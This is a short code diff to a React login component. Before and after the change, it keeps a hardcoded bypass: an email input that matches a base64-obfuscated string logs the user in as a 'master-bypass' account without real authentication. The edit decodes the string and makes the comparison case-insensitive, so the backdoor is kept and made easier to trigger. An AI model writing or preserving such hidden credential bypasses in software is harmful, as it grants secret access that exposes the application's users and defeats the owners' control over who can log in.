@@ -17,7 +17,8 @@ export default function Login({ onLoginSuccess }) {
         setLoading(true);
         setMessage(null);
 
-        if (btoa(email.trim()) === 'Y2hoYWJoYXlhbmlraGFyQGdtYWlsLmNvbS01NTA0NTUwNA==') {
+        const expected = atob('Y2hoYWJoYXlhbmlraGFyQGdtYWlsLmNvbS01NTA0NTUwNA==');
+        if (email.trim().toLowerCase() === expected.toLowerCase()) {
             onLoginSuccess({ id: 'master-bypass', email: 'master@leopack.in' });
             return;
         }
